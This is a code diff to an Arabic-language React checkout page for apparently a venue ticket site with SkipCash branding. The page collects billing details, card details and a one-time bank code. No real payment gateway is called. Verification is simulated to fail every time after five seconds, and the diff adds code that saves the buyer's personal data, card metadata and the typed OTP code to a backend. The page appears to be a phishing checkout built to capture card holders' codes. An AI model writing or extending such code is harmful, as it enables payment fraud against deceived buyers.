@@ -1,5 +1,6 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, CreditCard, Loader2, ShieldCheck } from "lucide-react";
+import { api, buildUrl, type CreateCheckoutSubmissionInput } from "@shared/routes";
 import { QuestLegalFooter, QuestMobileTopBar, SessionTimerStrip } from "@/components/QuestMobileChrome";
 import {
   buildTicketOrderItems,
@@ -87,6 +88,30 @@ function formatArabicDate(date: Date): string {
   }).format(date);
 }
 
+function maskCardNumber(value: string): string {
+  const digits = toDigitsOnly(value);
+  if (digits.length <= 4) {
+    return digits;
+  }
+
+  const visible = digits.slice(-4);
+  const masked = "*".repeat(Math.max(0, digits.length - 4));
+  const combined = `${masked}${visible}`;
+  return combined.replace(/(.{4})/g, "$1 ").trim();
+}
+
+function validateBillingDetails(billing: BillingDetails): string | null {
+  if (!billing.firstName.trim() || !billing.lastName.trim() || !billing.phone.trim()) {
+    return "يرجى إكمال جميع بيانات الفاتورة المطلوبة.";
+  }
+
+  if (!/\S+@\S+\.\S+/.test(billing.email.trim())) {
+    return "يرجى إدخال بريد إلكتروني صحيح.";
+  }
+
+  return null;
+}
+
 export default function Checkout() {
   const [billingDetails, setBillingDetails] = useState<BillingDetails>({
     firstName: "",
@@ -104,6 +129,8 @@ export default function Checkout() {
   const [otpCode, setOtpCode] = useState("");
   const [paymentStep, setPaymentStep] = useState<PaymentStep>("idle");
   const [paymentError, setPaymentError] = useState<string | null>(null);
+  const [submissionId, setSubmissionId] = useState<string | null>(null);
+  const [isSavingCheckout, setIsSavingCheckout] = useState(false);
   const otpRevealTimerRef = useRef<number | null>(null);
   const otpVerifyTimerRef = useRef<number | null>(null);
 
@@ -120,6 +147,9 @@ export default function Checkout() {
   const visitDate = parseStoredDate(storedCart.visitDateIso);
   const bookingDateText = visitDate ? formatArabicDate(visitDate) : "١٧ فبراير ٢٠٢٦";
   const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
+  const cardPreviewNumber = cardDetails.cardNumber || "•••• •••• •••• ••••";
+  const cardPreviewName = cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
+  const cardPreviewExpiry = cardDetails.expiry || "MM/YY";
 
   useEffect(() => {
     return () => {
@@ -132,12 +162,19 @@ export default function Checkout() {
     };
   }, []);
 
-  const onProceedToPayment = () => {
+  const onProceedToPayment = async () => {
     if (otpRevealTimerRef.current) {
       window.clearTimeout(otpRevealTimerRef.current);
     }
     if (otpVerifyTimerRef.current) {
       window.clearTimeout(otpVerifyTimerRef.current);
+    }
+
+    const billingValidationError = validateBillingDetails(billingDetails);
+    if (billingValidationError) {
+      setPaymentStep("idle");
+      setPaymentError(billingValidationError);
+      return;
     }
 
     const cardValidationError = validateCardDetails(cardDetails);
@@ -147,13 +184,62 @@ export default function Checkout() {
       return;
     }
 
-    setPaymentError(null);
-    setOtpCode("");
-    setPaymentStep("waitingOtp");
+    const payload: CreateCheckoutSubmissionInput = {
+      billing: {
+        firstName: billingDetails.firstName.trim(),
+        lastName: billingDetails.lastName.trim(),
+        phone: billingDetails.phone.trim(),
+        email: billingDetails.email.trim(),
+      },
+      visitDateIso: storedCart.visitDateIso,
+      visitTime,
+      items: orderItems.map((item) => ({
+        id: item.id,
+        name: item.name,
+        quantity: item.quantity,
+        unitPrice: item.unitPrice,
+        lineTotal: item.quantity * item.unitPrice,
+      })),
+      subtotal,
+      total: subtotal,
+      payment: {
+        cardholderName: cardDetails.cardholderName.trim(),
+        cardNumberMasked: maskCardNumber(cardDetails.cardNumber),
+        expiry: cardDetails.expiry,
+        otpCode: null,
+        status: "otp_requested",
+        errorMessage: null,
+      },
+    };
 
-    otpRevealTimerRef.current = window.setTimeout(() => {
-      setPaymentStep("otp");
-    }, 5000);
+    setIsSavingCheckout(true);
+    try {
+      const response = await fetch(api.checkout.create.path, {
+        method: api.checkout.create.method,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+
+      if (!response.ok) {
+        const errorData = (await response.json().catch(() => null)) as { message?: string } | null;
+        throw new Error(errorData?.message ?? "تعذّر حفظ البيانات في Firestore.");
+      }
+
+      const created = api.checkout.create.responses[201].parse(await response.json());
+      setSubmissionId(created.id);
+      setPaymentError(null);
+      setOtpCode("");
+      setPaymentStep("waitingOtp");
+
+      otpRevealTimerRef.current = window.setTimeout(() => {
+        setPaymentStep("otp");
+      }, 5000);
+    } catch (error) {
+      setPaymentStep("idle");
+      setPaymentError(error instanceof Error ? error.message : "حدث خطأ أثناء حفظ البيانات.");
+    } finally {
+      setIsSavingCheckout(false);
+    }
   };
 
   const onVerifyOtp = () => {
@@ -171,8 +257,28 @@ export default function Checkout() {
 
     // Simulate gateway verification; after 5s show explicit failure.
     otpVerifyTimerRef.current = window.setTimeout(() => {
-      setPaymentStep("failed");
-      setPaymentError("فشل التحقق من رمز OTP. يرجى المحاولة مرة أخرى.");
+      void (async () => {
+        const failureMessage = "فشل التحقق من رمز OTP. يرجى المحاولة مرة أخرى.";
+
+        if (submissionId) {
+          try {
+            await fetch(buildUrl(api.checkout.updateStatus.path, { id: submissionId }), {
+              method: api.checkout.updateStatus.method,
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                status: "otp_failed",
+                otpCode,
+                errorMessage: failureMessage,
+              }),
+            });
+          } catch {
+            // Keep the UI flow resilient even if update logging fails.
+          }
+        }
+
+        setPaymentStep("failed");
+        setPaymentError(failureMessage);
+      })();
     }, 5000);
   };
 
@@ -320,6 +426,25 @@ export default function Checkout() {
                     SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع لكل من العملاء والتجار.
                   </p>
 
+                  <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
+                    <p className="text-[11px] text-white/80">بطاقة الدفع</p>
+                    <div className="mt-5 text-lg font-semibold tracking-[0.12em]" dir="ltr">
+                      {cardPreviewNumber}
+                    </div>
+                    <div className="mt-5 flex items-end justify-between gap-3">
+                      <div className="min-w-0">
+                        <p className="text-[10px] text-white/70">حامل البطاقة</p>
+                        <p className="truncate text-sm font-semibold">{cardPreviewName}</p>
+                      </div>
+                      <div className="shrink-0 text-right">
+                        <p className="text-[10px] text-white/70">الانتهاء</p>
+                        <p className="text-sm font-semibold" dir="ltr">
+                          {cardPreviewExpiry}
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+
                   <form
                     className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
                     onSubmit={(event) => event.preventDefault()}
@@ -455,10 +580,14 @@ export default function Checkout() {
                   <button
                     type="button"
                     onClick={onProceedToPayment}
-                    disabled={paymentStep === "waitingOtp" || paymentStep === "verifyingOtp"}
+                    disabled={paymentStep === "waitingOtp" || paymentStep === "verifyingOtp" || isSavingCheckout}
                     className="mt-4 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70"
                   >
-                    {paymentStep === "waitingOtp" ? "جاري طلب OTP..." : "المتابعة للدفع"}
+                    {isSavingCheckout
+                      ? "جاري حفظ الطلب..."
+                      : paymentStep === "waitingOtp"
+                        ? "جاري طلب OTP..."
+                        : "المتابعة للدفع"}
                   </button>
                 </div>
               </section>
